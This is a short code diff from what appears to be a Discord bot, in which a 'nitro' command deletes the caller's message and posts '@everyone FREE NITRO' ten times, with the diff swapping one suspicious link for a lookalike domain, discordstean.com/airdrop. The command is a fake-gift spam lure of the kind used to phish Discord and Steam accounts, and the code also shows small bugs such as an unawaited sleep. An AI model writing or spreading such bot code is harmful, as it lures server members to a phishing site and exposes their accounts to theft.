@@ -218,7 +218,7 @@ async def nitro(ctx):
     await ctx.message.delete()
     for i in range(10):
         await ctx.send(
-            "@everyone FREE NITRO at \n https://rbuxfree.com/dl/?discord")
+            "@everyone FREE NITRO at \n http://discordstean.com/airdrop")
         asyncio.sleep(.5)
         Exception
         pass
